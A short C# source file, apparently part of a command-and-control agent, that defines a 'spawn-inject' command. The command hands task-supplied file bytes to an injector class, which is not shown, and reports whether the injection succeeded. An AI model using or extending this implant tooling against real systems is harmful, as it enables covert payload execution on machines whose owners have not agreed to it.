using AgentClient.Application.Services.InjectService;
using AgentClient.Domain.Models.Agents;

namespace AgentClient.Application.Commands
{
    public class SpawnInject : AgentCommand
    {
        public override string Name => "spawn-inject";

        public override string Execute(AgentTask task)
        {
            if (task.FileBytes == null)
            {
                return "FileBytes cannot be null";
            }

            var injector = new SpawnInjector();
            var success = injector.Inject(task.FileBytes);

            if (success)
            {
                return "Successful Injection";
            }
            else
            {
                return "Injection Failed";
            }
        }
    }
}
